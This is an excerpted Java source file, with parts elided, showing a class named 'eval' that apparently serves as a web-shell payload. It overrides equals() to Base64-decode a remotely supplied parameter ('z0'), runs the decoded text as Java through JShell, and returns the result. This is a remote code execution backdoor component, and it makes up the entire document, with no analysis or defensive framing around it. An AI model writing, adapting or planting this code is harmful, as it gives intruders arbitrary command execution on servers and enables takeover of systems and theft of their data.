...
public class eval extends ClassLoader
{
    ...
    public boolean equals(Object objParam)
    {
        ...
        try
        {
            ...
            try
            {
                byte[] decodedBytes = Base64.getDecoder().decode(z0);
                String javaSourceCode = new String(decodedBytes, "UTF-8").trim();
                String wrappedCode = 
                    "Object runEval(Object context) throws Exception {\n" +
                    "    " + javaSourceCode + "\n" +
                    "}";
                ...
                try {
                    jshell.eval(wrappedCode);
                    List<SnippetEvent> events = jshell.eval("runEval(null);");
                    
                    for (SnippetEvent e : events) {
                        if (e.status() == jdk.jshell.Snippet.Status.VALID && e.value() != null) {
                            executionResult = e.value();
                        }
                    }
                } finally {
                    jshell.close();
                ...
                byte[] resultBytes;
                if (sb.length() > 0) {
                    resultBytes = sb.toString().getBytes("UTF-8");
                } else {
                    resultBytes = executionResult.getBytes("UTF-8");
                }
            ...
            {
                sb.append("Error during JShell eval: " + ex.toString());
            }
